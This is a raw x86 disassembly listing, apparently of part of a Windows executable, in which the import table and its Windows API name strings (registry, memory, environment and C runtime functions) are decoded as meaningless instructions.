  4092e3:	add    BYTE PTR [eax],al
  4092e5:	add    BYTE PTR [eax],al
  4092e7:	add    ah,ah
  4092e9:	pushf  
  4092ea:	add    BYTE PTR [eax],al
  4092ec:	push   0xb4000091
  4092f1:	xchg   esp,eax
	...
  4092fa:	add    BYTE PTR [eax],al
  4092fc:	push   cs
  4092fd:	popf   
  4092fe:	add    BYTE PTR [eax],al
  409300:	pusha  
  409301:	xchg   ecx,eax
  409302:	add    BYTE PTR [eax],al
  409304:	int3   
  409305:	xchg   esp,eax
	...
  40930e:	add    BYTE PTR [eax],al
  409310:	cmp    BYTE PTR [ebp-0x6e880000],bl
  409316:	add    BYTE PTR [eax],al
  409318:	fcom   QWORD PTR [eax+eax*1+0x0]
  40931f:	add    BYTE PTR [eax],al
  409321:	add    BYTE PTR [eax],al
  409323:	add    BYTE PTR [ebp+ebx*4+0x0],bl
  409327:	add    BYTE PTR [eax-0x67ffff6f],cl
  40932d:	xchg   ebx,eax
	...
  409336:	add    BYTE PTR [eax],al
  409338:	nop
  409339:	popf   
  40933a:	add    BYTE PTR [eax],al
  40933c:	inc    esp
  40933d:	nop
	...
  409352:	add    BYTE PTR [eax],al
  409354:	fs xchg ebp,eax
  409356:	add    BYTE PTR [eax],al
  409358:	je     0x4092ef
  40935a:	add    BYTE PTR [eax],al
  40935c:	test   BYTE PTR [ebp-0x6a680000],dl
  409362:	add    BYTE PTR [eax],al
  409364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409365:	xchg   ebp,eax
  409366:	add    BYTE PTR [eax],al
  409368:	mov    edx,0xcc000095
  40936d:	xchg   ebp,eax
  40936e:	add    BYTE PTR [eax],al
  409370:	loop   0x409307
  409372:	add    BYTE PTR [eax],al
  409374:	hlt    
  409375:	xchg   ebp,eax
  409376:	add    BYTE PTR [eax],al
  409378:	or     dl,BYTE PTR [esi-0x69e60000]
  40937e:	add    BYTE PTR [eax],al
  409380:	add    BYTE PTR [eax],al
  409382:	add    BYTE PTR [eax],al
  409384:	dec    esi
  409385:	add    DWORD PTR [eax],eax
  409387:	or     BYTE PTR [ecx+eax*1+0x0],0x80
  40938c:	adc    DWORD PTR [eax],eax
  40938e:	add    BYTE PTR [eax-0x7ffffeb8],al
  409394:	add    BYTE PTR [eax],al
  409396:	add    BYTE PTR [eax],al
  409398:	sbb    BYTE PTR [ebp+0x0],0x0
  40939f:	add    BYTE PTR [esi+edx*4-0x69480000],ch
  4093a6:	add    BYTE PTR [eax],al
  4093a8:	enter  0x96,0x0
  4093ac:	(bad)  
  4093ad:	xchg   esi,eax
  4093ae:	add    BYTE PTR [eax],al
  4093b0:	repnz xchg esi,eax
  4093b2:	add    BYTE PTR [eax],al
  4093b4:	or     dl,BYTE PTR [edi-0x698a0000]
  4093ba:	add    BYTE PTR [eax],al
  4093bc:	cmp    BYTE PTR [edi-0x68b80000],dl
  4093c2:	add    BYTE PTR [eax],al
  4093c4:	pop    esi
  4093c5:	xchg   edi,eax
  4093c6:	add    BYTE PTR [eax],al
  4093c8:	jo     0x409361
  4093ca:	add    BYTE PTR [eax],al
  4093cc:	nop
  4093cd:	xchg   esi,eax
  4093ce:	add    BYTE PTR [eax],al
  4093d0:	xchg   esi,eax
  4093d1:	xchg   edi,eax
  4093d2:	add    BYTE PTR [eax],al
  4093d4:	test   al,0x97
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	ret    0x97
  4093db:	add    al,bl
  4093dd:	xchg   edi,eax
  4093de:	add    BYTE PTR [eax],al
  4093e0:	repnz xchg edi,eax
  4093e2:	add    BYTE PTR [eax],al
  4093e4:	or     BYTE PTR [eax-0x67e40000],bl
  4093ea:	add    BYTE PTR [eax],al
  4093ec:	ss cwde 
  4093ee:	add    BYTE PTR [eax],al
  4093f0:	dec    eax
  4093f1:	cwde   
  4093f2:	add    BYTE PTR [eax],al
  4093f4:	pop    edx
  4093f5:	cwde   
  4093f6:	add    BYTE PTR [eax],al
  4093f8:	jo     0x409392
  4093fa:	add    BYTE PTR [eax],al
  4093fc:	adc    BYTE PTR [edi-0x697c0000],0x0
  409403:	add    BYTE PTR [eax-0x6a],ch
  409406:	add    BYTE PTR [eax],al
  409408:	pop    esp
  409409:	xchg   esi,eax
  40940a:	add    BYTE PTR [eax],al
  40940c:	push   eax
  40940d:	xchg   esi,eax
  40940e:	add    BYTE PTR [eax],al
  409410:	inc    edx
  409411:	xchg   esi,eax
  409412:	add    BYTE PTR [eax],al
  409414:	sub    BYTE PTR [edi-0x62660000],dl
  40941a:	add    BYTE PTR [eax],al
  40941c:	add    BYTE PTR [eax],al
  40941e:	add    BYTE PTR [eax],al
  409420:	mov    BYTE PTR [edx+0x2a80000],bl
  409426:	add    BYTE PTR [eax-0x7fffff5c],al
  40942c:	je     0x4093c8
  40942e:	add    BYTE PTR [eax],al
  409430:	xor    eax,DWORD PTR [eax]
  409432:	add    BYTE PTR [eax-0x7fffffcf],al
  409438:	cmp    al,BYTE PTR [eax]
  40943a:	add    BYTE PTR [eax-0x7fffffd6],al
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	add    BYTE PTR [eax],al
  409443:	and    BYTE PTR [eax-0x66],0x0
  409447:	add    BYTE PTR [esi+0x0],bl
  40944a:	add    BYTE PTR [eax+0x0],al
  409450:	rcr    BYTE PTR [edx-0x65460000],1
  409456:	add    BYTE PTR [eax],al
  409458:	enter  0x1,0x80
  40945c:	inc    esi
  40945d:	fwait
  40945e:	add    BYTE PTR [eax],al
  409460:	sahf   
  409461:	add    BYTE PTR [eax],al
  409463:	xor    BYTE PTR [eax],0x9b
  409466:	add    BYTE PTR [eax],al
  409468:	and    al,0x9b
  40946a:	add    BYTE PTR [eax],al
  40946c:	push   cs
  40946d:	fwait
  40946e:	add    BYTE PTR [eax],al
  409470:	(bad)  
  409471:	call   0x0:0x9aec0000
  409478:	ficomp WORD PTR [edx-0x655a0000]
  40947e:	add    BYTE PTR [eax],al
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	mov    al,ds:0x94000098
  409489:	cwde   
  40948a:	add    BYTE PTR [eax],al
  40948c:	mov    edx,0xae000098
  409491:	cwde   
  409492:	add    BYTE PTR [eax],al
  409494:	add    BYTE PTR [eax],al
  409496:	add    BYTE PTR [eax],al
  409498:	push   0x5400009b
  40949d:	pushf  
  40949e:	add    BYTE PTR [eax],al
  4094a0:	pushfw 
  4094a2:	add    BYTE PTR [eax],al
  4094a4:	add    BYTE PTR [eax],al
  4094a6:	add    BYTE PTR [eax],al
  4094a8:	test   BYTE PTR [ebx-0x64600000],bl
  4094ae:	add    BYTE PTR [eax],al
  4094b0:	add    BYTE PTR [eax],al
  4094b2:	add    BYTE PTR [eax],al
  4094b4:	out    0x9b,al
  4094b6:	add    BYTE PTR [eax],al
  4094b8:	add    BYTE PTR [eax],al
  4094ba:	add    BYTE PTR [eax],al
  4094bc:	adc    al,0x9c
  4094be:	add    BYTE PTR [eax],al
  4094c0:	rcr    BYTE PTR [ebx-0x64420000],cl
  4094c6:	add    BYTE PTR [eax],al
  4094c8:	add    BYTE PTR [eax],al
  4094ca:	add    BYTE PTR [eax],al
  4094cc:	cli    
  4094cd:	fwait
  4094ce:	add    BYTE PTR [eax],al
  4094d0:	add    BYTE PTR [eax],al
  4094d2:	add    BYTE PTR [eax],al
  4094d4:	jl     0x409471
  4094d6:	add    BYTE PTR [eax],al
  4094d8:	add    BYTE PTR [eax],al
  4094da:	add    BYTE PTR [eax],al
  4094dc:	sub    bl,BYTE PTR [eax+eax*1+0x9c4400]
  4094e3:	add    BYTE PTR [eax],al
  4094e5:	add    BYTE PTR [eax],al
  4094e7:	add    dh,ah
  4094e9:	cdq    
  4094ea:	add    BYTE PTR [eax],al
  4094ec:	fcomp  QWORD PTR [ecx-0x660c0000]
  4094f2:	add    BYTE PTR [eax],al
  4094f4:	mov    esi,0xb2000099
  4094f9:	cdq    
  4094fa:	add    BYTE PTR [eax],al
  4094fc:	(bad)  
  4094fd:	cdq    
  4094fe:	add    BYTE PTR [eax],al
  409500:	push   ss
  409501:	call   0x0:0x9a2a0000
  409508:	cmp    BYTE PTR [edx-0x67220000],bl
  40950e:	add    BYTE PTR [eax],al
  409510:	aam    0x98
  409512:	add    BYTE PTR [eax],al
  409514:	(bad)  
  409515:	cwde   
  409516:	add    BYTE PTR [eax],al
  409518:	or     bl,BYTE PTR [ecx-0x67100000]
  40951e:	add    BYTE PTR [eax],al
  409520:	sbb    bl,BYTE PTR [ecx-0x66d80000]
  409526:	add    BYTE PTR [eax],al
  409528:	cmp    BYTE PTR [ecx-0x66ba0000],bl
  40952e:	add    BYTE PTR [eax],al
  409530:	push   esi
  409531:	cdq    
  409532:	add    BYTE PTR [eax],al
  409534:	push   0x70000099
  409539:	cdq    
  40953a:	add    BYTE PTR [eax],al
  40953c:	js     0x4094d7
  40953e:	add    BYTE PTR [eax],al
  409540:	aam    0x99
  409542:	add    BYTE PTR [eax],al
  409544:	sbb    BYTE PTR [ecx-0x671a0000],0x0
  40954b:	add    BYTE PTR [eax-0x61ffff67],dl
  409551:	cdq    
  409552:	add    BYTE PTR [eax],al
  409554:	lods   al,BYTE PTR ds:[esi]
  409555:	popf   
  409556:	add    BYTE PTR [eax],al
  409558:	ret    0x9d
  40955b:	add    ah,cl
  40955d:	popf   
  40955e:	add    BYTE PTR [eax],al
  409560:	add    BYTE PTR [eax],al
  409562:	add    BYTE PTR [eax],al
  409564:	xchg   BYTE PTR [edx],al
  409566:	push   edx
  409567:	gs addr16 dec edi
  40956a:	jo     0x4095d1
  40956c:	outs   dx,BYTE PTR ds:[esi]
  40956d:	dec    ebx
  40956e:	gs jns 0x4095b6
  409571:	js     0x4095ca
  409573:	add    BYTE PTR [edi+0x2],dh
  409576:	push   edx
  409577:	gs addr16 inc ebp
  40957a:	outs   dx,BYTE PTR ds:[esi]
  40957b:	jne    0x4095ea
  40957d:	push   esi
  40957e:	popa   
  40957f:	ins    BYTE PTR es:[edi],dx
  409580:	jne    0x4095e7
  409582:	push   edi
  409583:	add    BYTE PTR [ebx+0x67655202],dl
  409589:	push   ecx
  40958a:	jne    0x4095f1
  40958c:	jb     0x409607
  40958e:	push   esi
  40958f:	popa   
  409590:	ins    BYTE PTR es:[edi],dx
  409591:	jne    0x4095f8
  409593:	inc    ebp
  409594:	js     0x4095ed
  409596:	add    BYTE PTR [eax],al
  409598:	push   ebp
  409599:	add    dl,BYTE PTR [edx+0x65]
  40959c:	addr16 inc ebx
  40959e:	ins    BYTE PTR es:[edi],dx
  40959f:	outs   dx,DWORD PTR ds:[esi]
  4095a0:	jae    0x409607
  4095a2:	dec    ebx
  4095a3:	gs jns 0x4095a6
  4095a6:	lea    eax,[edx]
  4095a8:	push   edx
  4095a9:	gs addr16 push ecx
  4095ac:	jne    0x409613
  4095ae:	jb     0x409629
  4095b0:	dec    ecx
  4095b1:	outs   dx,BYTE PTR ds:[esi]
  4095b2:	outs   dx,WORD PTR ds:[esi]
  4095b4:	dec    ebx
  4095b5:	gs jns 0x40960f
  4095b8:	add    BYTE PTR [eax],al
  4095ba:	pop    esi
  4095bb:	add    dl,BYTE PTR [edx+0x65]
  4095be:	addr16 inc ebx
  4095c0:	jb     0x409627
  4095c2:	popa   
  4095c3:	je     0x40962a
  4095c5:	dec    ebx
  4095c6:	gs jns 0x40960e
  4095c9:	js     0x409622
  4095cb:	add    BYTE PTR [eax],ch
  4095cd:	add    DWORD PTR [ebp+0x76],eax
  4095d0:	outs   dx,BYTE PTR gs:[esi]
  4095d2:	je     0x40962b
  4095d4:	jb     0x40963f
  4095d6:	je     0x40963d
  4095d8:	push   esp
  4095d9:	jb     0x40963c
  4095db:	outs   dx,BYTE PTR ds:[esi]
  4095dc:	jae    0x409644
  4095de:	gs jb  0x4095e1
  4095e1:	add    BYTE PTR [edx],ah
  4095e3:	add    DWORD PTR [ebp+0x76],eax
  4095e6:	outs   dx,BYTE PTR gs:[esi]
  4095e8:	je     0x40963f
  4095ea:	outs   dx,BYTE PTR ds:[esi]
  4095eb:	jb     0x409652
  4095ed:	imul   esi,DWORD PTR [bp+di+0x74],0x21007265
  4095f5:	add    DWORD PTR [ebp+0x76],eax
  4095f8:	outs   dx,BYTE PTR gs:[esi]
  4095fa:	je     0x40964f
  4095fc:	gs je  0x409648
  4095ff:	outs   dx,BYTE PTR ds:[esi]
  409600:	outs   dx,WORD PTR ds:[esi]
  409602:	jb     0x409671
  409604:	popa   
  409605:	je     0x409670
  409607:	outs   dx,DWORD PTR ds:[esi]
  409608:	outs   dx,BYTE PTR ds:[esi]
  409609:	add    BYTE PTR [eax],ah
  40960b:	add    DWORD PTR [ebp+0x76],eax
  40960e:	outs   dx,BYTE PTR gs:[esi]
  409610:	je     0x409664
  409612:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x1d007265
  40961b:	add    DWORD PTR [ebp+0x76],eax
  40961e:	outs   dx,BYTE PTR gs:[esi]
  409620:	je     0x409663
  409622:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  409626:	imul   esi,DWORD PTR [ecx+edi*2+0x49],0x6e6f4364
  40962e:	je     0x4096a2
  409630:	outs   dx,DWORD PTR ds:[esi]
  409631:	ins    BYTE PTR es:[edi],dx
  409632:	add    BYTE PTR [eax],al
  409634:	inc    ecx
  409635:	inc    esp
  409636:	push   esi
  409637:	inc    ecx
  409638:	push   eax
  409639:	dec    ecx
  40963a:	xor    esi,DWORD PTR [edx]
  40963c:	cs fs ins BYTE PTR es:[edi],dx
  40963f:	ins    BYTE PTR es:[edi],dx
  409640:	add    BYTE PTR [eax],al
  409642:	mov    dl,0x3
  409644:	dec    esp
  409645:	outs   dx,DWORD PTR ds:[esi]
  409646:	arpl   WORD PTR [ecx+0x6c],sp
  409649:	inc    ecx
  40964a:	ins    BYTE PTR es:[edi],dx
  40964b:	ins    BYTE PTR es:[edi],dx
  40964c:	outs   dx,DWORD PTR ds:[esi]
  40964d:	arpl   WORD PTR [eax],ax
  40964f:	add    BYTE PTR [esi+0x636f4c03],dh
  409655:	popa   
  409656:	ins    BYTE PTR es:[edi],dx
  409657:	inc    esi
  409658:	jb     0x4096bf
  40965a:	add    BYTE PTR gs:[edx],dl
  40965d:	push   es
  40965e:	ins    BYTE PTR es:[edi],dx
  40965f:	jae    0x4096d5
  409661:	jb     0x4096c6
  409663:	ins    DWORD PTR es:[edi],dx
  409664:	jo     0x4096cf
  409666:	push   edi
  409667:	add    BYTE PTR [ebx],bl
  409669:	add    eax,DWORD PTR [edi+0x6c]
  40966c:	outs   dx,DWORD PTR ds:[esi]
  40966d:	bound  esp,QWORD PTR [ecx+0x6c]
  409670:	inc    ecx
  409671:	ins    BYTE PTR es:[edi],dx
  409672:	ins    BYTE PTR es:[edi],dx
  409673:	outs   dx,DWORD PTR ds:[esi]
  409674:	arpl   WORD PTR [eax],ax
  409676:	add    eax,DWORD PTR es:[edi+0x6c]
  40967a:	outs   dx,DWORD PTR ds:[esi]
  40967b:	bound  esp,QWORD PTR [ecx+0x6c]
  40967e:	dec    esp
  40967f:	outs   dx,DWORD PTR ds:[esi]
  409680:	arpl   WORD PTR [ebx+0x0],bp
  409683:	add    BYTE PTR [edi],cl
  409685:	push   es
  409686:	ins    BYTE PTR es:[edi],dx
  409687:	jae    0x4096fd
  409689:	jb     0x4096ee
  40968b:	ins    DWORD PTR es:[edi],dx
  40968c:	jo     0x4096e5
  40968e:	add    BYTE PTR [eax],al
  409690:	cdq    
  409691:	add    al,BYTE PTR [edi+0x65]
  409694:	je     0x4096e6
  409696:	jb     0x409701
  409698:	jbe    0x4096fb
  40969a:	je     0x409701
  40969c:	push   eax
  40969d:	jb     0x40970e
  40969f:	imul   bp,WORD PTR [ebp+eiz*2+0x53],0x6365
  4096a6:	je     0x409711
  4096a8:	outs   dx,DWORD PTR ds:[esi]
  4096a9:	outs   dx,BYTE PTR ds:[esi]
  4096aa:	push   edi
  4096ab:	add    BYTE PTR [ebx],bl
  4096ad:	push   es
  4096ae:	ins    BYTE PTR es:[edi],dx
  4096af:	jae    0x409725
  4096b1:	jb     0x40971f
  4096b3:	outs   dx,BYTE PTR gs:[esi]
  4096b5:	push   edi
  4096b6:	add    BYTE PTR [eax],al
  4096b8:	sub    eax,0x6f6c4703
  4096bd:	bound  esp,QWORD PTR [ecx+0x6c]
  4096c0:	push   ebp
  4096c1:	outs   dx,BYTE PTR ds:[esi]
  4096c2:	ins    BYTE PTR es:[edi],dx
  4096c3:	outs   dx,DWORD PTR ds:[esi]
  4096c4:	arpl   WORD PTR [ebx+0x0],bp
  4096c7:	add    BYTE PTR [edx],ah
  4096c9:	add    eax,DWORD PTR [edi+0x6c]
  4096cc:	outs   dx,DWORD PTR ds:[esi]
  4096cd:	bound  esp,QWORD PTR [ecx+0x6c]
  4096d0:	inc    esi
  4096d1:	jb     0x409738
  4096d3:	add    BYTE PTR gs:[eax],al
  4096d6:	push   ebp
  4096d7:	add    DWORD PTR [ebp+0x78],eax
  4096da:	jo     0x40973d
  4096dc:	outs   dx,BYTE PTR ds:[esi]
  4096dd:	fs inc ebp
  4096df:	outs   dx,BYTE PTR ds:[esi]
  4096e0:	jbe    0x40974b
  4096e2:	jb     0x409753
  4096e4:	outs   dx,BYTE PTR ds:[esi]
  4096e5:	ins    DWORD PTR es:[edi],dx
  4096e6:	outs   dx,BYTE PTR gs:[esi]
  4096e8:	je     0x40973d
  4096ea:	je     0x40975e
  4096ec:	imul   ebp,DWORD PTR [esi+0x67],0x14005773
  4096f3:	add    eax,DWORD PTR [edi+0x65]
  4096f6:	je     0x40974f
  4096f8:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4096ff:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409706:	jns    0x40975f
  409708:	add    BYTE PTR [eax],al
  40970a:	fld    QWORD PTR [edx]
  40970c:	inc    edi
  40970d:	gs je  0x409763
  409710:	jns    0x409785
  409712:	je     0x409779
  409714:	ins    DWORD PTR es:[edi],dx
  409715:	push   edi
  409716:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  40971d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409724:	jns    0x40977d
  409726:	add    BYTE PTR [eax],al
  409728:	push   ecx
  409729:	add    al,BYTE PTR [edi+0x65]
  40972c:	je     0x40977a
  40972e:	popa   
  40972f:	jae    0x4097a5
  409731:	inc    ebp
  409732:	jb     0x4097a6
  409734:	outs   dx,DWORD PTR ds:[esi]
  409735:	jb     0x409737
  409737:	add    cl,bh
  409739:	add    al,0x53
  40973b:	gs je  0x409783
  40973e:	jb     0x4097b2
  409740:	outs   dx,DWORD PTR ds:[esi]
  409741:	jb     0x409790
  409743:	outs   dx,DWORD PTR ds:[esi]
  409744:	fs add BYTE PTR gs:[eax],al
  409748:	cmp    eax,DWORD PTR [ebx]
  40974a:	dec    eax
  40974b:	gs popa 
  40974d:	jo     0x4097a2
  40974f:	gs je  0x40979b
  409752:	outs   dx,BYTE PTR ds:[esi]
  409753:	outs   dx,WORD PTR ds:[esi]
  409755:	jb     0x4097c4
  409757:	popa   
  409758:	je     0x4097c3
  40975a:	outs   dx,DWORD PTR ds:[esi]
  40975b:	outs   dx,BYTE PTR ds:[esi]
  40975c:	add    BYTE PTR [eax],al
  40975e:	out    dx,al
  40975f:	add    al,BYTE PTR [edi+0x65]
  409762:	je     0x4097b8
  409764:	push   0x64616572
  409769:	dec    esp
  40976a:	outs   dx,DWORD PTR ds:[esi]
  40976b:	arpl   WORD PTR [ecx+0x6c],sp
  40976e:	gs add dl,cl
  409771:	add    DWORD PTR [edi+0x65],eax
  409774:	je     0x4097b9
  409776:	outs   dx,DWORD PTR ds:[esi]
  409777:	ins    DWORD PTR es:[edi],dx
  409778:	ins    DWORD PTR es:[edi],dx
  409779:	popa   
  40977a:	outs   dx,BYTE PTR ds:[esi]
  40977b:	fs dec esp
  40977d:	imul   ebp,DWORD PTR [esi+0x65],0x3460057
  409784:	dec    ecx
  409785:	outs   dx,BYTE PTR ds:[esi]
  409786:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x6f436563
  40978e:	ins    DWORD PTR es:[edi],dx
  40978f:	jo     0x4097fd
  409791:	gs je  0x4097f9
  409794:	add    BYTE PTR [eax],al
  409796:	stos   DWORD PTR es:[edi],eax
  409797:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  40979b:	fs dec esp
  40979d:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4097a4:	js     0x4097fd
  4097a6:	add    BYTE PTR [eax],al
  4097a8:	inc    ebp
  4097a9:	add    ecx,DWORD PTR [ecx+0x6e]
  4097ac:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x65426563
  4097b4:	imul   ebp,DWORD PTR [bp+0x49],0x6974696e
  4097bc:	popa   
  4097bd:	ins    BYTE PTR es:[edi],dx
  4097be:	imul   edi,DWORD PTR [edx+0x65],0x47026700
  4097c5:	gs je  0x409815
  4097c8:	outs   dx,DWORD PTR ds:[esi]
  4097c9:	fs jne 0x409838
  4097cc:	gs dec eax
  4097ce:	popa   
  4097cf:	outs   dx,BYTE PTR ds:[esi]
  4097d0:	fs ins BYTE PTR es:[edi],dx
  4097d2:	gs inc ebp
  4097d4:	js     0x40982d
  4097d6:	add    BYTE PTR [eax],al
  4097d8:	xchg   edi,eax
  4097d9:	add    al,0x52
  4097db:	gs ins BYTE PTR es:[edi],dx
  4097dd:	gs popa 
  4097df:	jae    0x409846
  4097e1:	push   ebx
  4097e2:	push   edx
  4097e3:	push   edi
  4097e4:	dec    esp
  4097e5:	outs   dx,DWORD PTR ds:[esi]
  4097e6:	arpl   WORD PTR [ebx+0x45],bp
  4097e9:	js     0x40984e
  4097eb:	ins    BYTE PTR es:[edi],dx
  4097ec:	jne    0x409861
  4097ee:	imul   esi,DWORD PTR [esi+0x65],0x4f03ff00
  4097f5:	jne    0x40986b
  4097f7:	jo     0x40986e
  4097f9:	je     0x40983f
  4097fb:	bound  esi,QWORD PTR gs:[ebp+0x67]
  4097ff:	push   ebx
  409800:	je     0x409874
  409802:	imul   ebp,DWORD PTR [esi+0x67],0x68000057
  409809:	add    al,BYTE PTR [edi+0x65]
  40980c:	je     0x40985b
  40980e:	outs   dx,DWORD PTR ds:[esi]
  40980f:	fs jne 0x40987e
  409812:	gs dec eax
  409814:	popa   
  409815:	outs   dx,BYTE PTR ds:[esi]
  409816:	fs ins BYTE PTR es:[edi],dx
  409818:	gs push edi
  40981a:	add    BYTE PTR [eax],al
  40981c:	add    BYTE PTR [eax],al
  40981e:	inc    ecx
  40981f:	arpl   WORD PTR [ecx+0x75],si
  409822:	imul   esi,DWORD PTR [edx+0x65],0x4c575253
  409829:	outs   dx,DWORD PTR ds:[esi]
  40982a:	arpl   WORD PTR [ebx+0x45],bp
  40982d:	js     0x409892
  40982f:	ins    BYTE PTR es:[edi],dx
  409830:	jne    0x4098a5
  409832:	imul   esi,DWORD PTR [esi+0x65],0x46019a00
  409839:	outs   dx,DWORD PTR ds:[esi]
  40983a:	jb     0x4098a9
  40983c:	popa   
  40983d:	je     0x40988c
  40983f:	gs jae 0x4098b5
  409842:	popa   
  409843:	addr16 gs push edi
  409846:	add    BYTE PTR [eax],al
  409848:	sahf   
  409849:	add    al,BYTE PTR [edi+0x65]
  40984c:	je     0x40989e
  40984e:	jb     0x4098bf
  409850:	arpl   WORD PTR [ecx+0x64],ax
  409853:	fs jb  0x4098bb
  409856:	jae    0x4098cb
  409858:	add    BYTE PTR [eax],al
  40985a:	arpl   WORD PTR [edx],ax
  40985c:	inc    edi
  40985d:	gs je  0x4098ad
  409860:	outs   dx,DWORD PTR ds:[esi]
  409861:	fs jne 0x4098d0
  409864:	gs inc esi
  409866:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  40986e:	add    BYTE PTR [eax],al
  409870:	lar    eax,WORD PTR [edi+0x65]
  409874:	je     0x4098b9
  409876:	jne    0x4098ea
  409878:	jb     0x4098df
  40987a:	outs   dx,BYTE PTR ds:[esi]
  40987b:	je     0x4098d1
  40987d:	push   0x64616572
  409882:	dec    ecx
  409883:	add    BYTE PTR fs:[eax],al
  409886:	dec    ebx
  409887:	inc    ebp
  409888:	push   edx
  409889:	dec    esi
  40988a:	inc    ebp
  40988b:	dec    esp
  40988c:	xor    esi,DWORD PTR [edx]
  40988e:	cs fs ins BYTE PTR es:[edi],dx
  409891:	ins    BYTE PTR es:[edi],dx
  409892:	add    BYTE PTR [eax],al
  409894:	xor    DWORD PTR [eax],eax
  409896:	inc    ebx
  409897:	push   0x654e7261
  40989c:	js     0x409912
  40989e:	push   edi
  40989f:	add    BYTE PTR [edi],bh
  4098a1:	add    cl,BYTE PTR [edi+ebp*2+0x61]
  4098a5:	fs push ebx
  4098a7:	je     0x40991b
  4098a9:	imul   ebp,DWORD PTR [esi+0x67],0x2eb0057
  4098b0:	push   ebx
  4098b1:	gs je  0x4098f7
  4098b4:	jne    0x409928
  4098b6:	jae    0x409927
  4098b8:	jb     0x4098ba
  4098ba:	xor    BYTE PTR [edx],al
  4098bc:	dec    esp
  4098bd:	outs   dx,DWORD PTR ds:[esi]
  4098be:	popa   
  4098bf:	fs inc ebx
  4098c1:	jne    0x409935
  4098c3:	jae    0x409934
  4098c5:	jb     0x40991e
  4098c7:	add    BYTE PTR [ebp+0x53],dl
  4098ca:	inc    ebp
  4098cb:	push   edx
  4098cc:	xor    esi,DWORD PTR [edx]
  4098ce:	cs fs ins BYTE PTR es:[edi],dx
  4098d1:	ins    BYTE PTR es:[edi],dx
  4098d2:	add    BYTE PTR [eax],al
  4098d4:	or     eax,DWORD PTR ds:0x6d6d656d
  4098da:	outs   dx,DWORD PTR ds:[esi]
  4098db:	jbe    0x409942
  4098dd:	add    ch,al
  4098df:	add    al,0x66
  4098e1:	jb     0x409948
  4098e3:	add    BYTE PTR gs:[eax],al
  4098e6:	std    
  4098e7:	add    al,0x6d
  4098e9:	popa   
  4098ea:	ins    BYTE PTR es:[edi],dx
  4098eb:	ins    BYTE PTR es:[edi],dx
  4098ec:	outs   dx,DWORD PTR ds:[esi]
  4098ed:	arpl   WORD PTR [eax],ax
  4098ef:	add    ah,ch
  4098f1:	add    ebx,DWORD PTR [edi+0x76]
  4098f4:	jae    0x409964
  4098f6:	ja     0x409968
  4098f8:	jb     0x409963
  4098fa:	outs   dx,BYTE PTR ds:[esi]
  4098fb:	je     0x409963
  4098fd:	add    BYTE PTR [edx],bl
  4098ff:	add    ebx,DWORD PTR [edi+0x70]
  409902:	jne    0x409976
  409904:	arpl   WORD PTR gs:[ecx+0x6c],sp
  409908:	ins    BYTE PTR es:[edi],dx
  409909:	add    BYTE PTR [ebx],dl
  40990b:	add    BYTE PTR [edi],bh
  40990d:	aas    
  40990e:	xor    eax,DWORD PTR [eax+0x59]
  409911:	inc    ecx
  409912:	pop    eax
  409913:	push   eax
  409914:	inc    ecx
  409915:	pop    eax
  409916:	inc    eax
  409917:	pop    edx
  409918:	add    BYTE PTR [eax],al
  40991a:	outs   dx,DWORD PTR ds:[esi]
  40991b:	add    BYTE PTR [edi+0x58],bl
  40991e:	arpl   WORD PTR [eax+0x74],si
  409921:	inc    esi
  409922:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  40992a:	pop    edi
  40992b:	pop    edi
  40992c:	jo     0x40998d
  40992e:	pop    edi
  40992f:	arpl   WORD PTR [edi+0x6d],bp
  409932:	ins    DWORD PTR es:[edi],dx
  409933:	outs   dx,DWORD PTR ds:[esi]
  409934:	fs add BYTE PTR gs:[eax],al
  409938:	adc    DWORD PTR [ecx],eax
  40993a:	pop    edi
  40993b:	popa   
  40993c:	ins    DWORD PTR es:[edi],dx
  40993d:	jae    0x4099a6
  40993f:	pop    edi
  409940:	gs js  0x4099ac
  409943:	je     0x409945
  409945:	add    BYTE PTR [ecx+0x675f5f00],ah
  40994b:	gs je  0x4099bb
  40994e:	popa   
  40994f:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  409956:	loop   0x409958
  409958:	pop    edi
  409959:	pop    edi
  40995a:	jae    0x4099c1
  40995c:	je     0x4099bd
  40995e:	popa   
  40995f:	jo     0x4099d1
  409961:	pop    edi
  409962:	je     0x4099dd
  409964:	jo     0x4099cb
  409966:	add    BYTE PTR [eax],al
  409968:	scas   al,BYTE PTR es:[edi]
  409969:	add    al,0x65
  40996b:	js     0x4099d6
  40996d:	je     0x40996f
  40996f:	add    BYTE PTR [ebx+0x1],dh
  409972:	pop    edi
  409973:	gs js  0x4099df
  409976:	je     0x409978
  409978:	and    al,0x1
  40997a:	pop    edi
  40997b:	arpl   WORD PTR [ebp+0x78],sp
  40997e:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  409986:	jo     0x4099e7
  409988:	pop    edi
  409989:	ins    WORD PTR es:[edi],dx
  40998b:	outs   dx,DWORD PTR ds:[esi]
  40998c:	fs add BYTE PTR gs:[eax],al
  409990:	pop    es
  409991:	add    bl,BYTE PTR [edi+0x69]
  409994:	jae    0x409a03
  409996:	bound  esp,QWORD PTR [edx+0x6c]
  409999:	gs popa 
  40999b:	add    BYTE PTR fs:[eax],al
  40999e:	in     al,0x0
  4099a0:	pop    edi
  4099a1:	pop    edi
  4099a2:	jae    0x409a09
  4099a4:	je     0x409a1b
  4099a6:	jae    0x409a0d
  4099a8:	jb     0x409a17
  4099aa:	popa   
  4099ab:	je     0x409a15
  4099ad:	gs jb  0x409a22
  4099b0:	add    BYTE PTR [eax],al
  4099b2:	call   0x6ea9f8b8
  4099b7:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xf7006d72
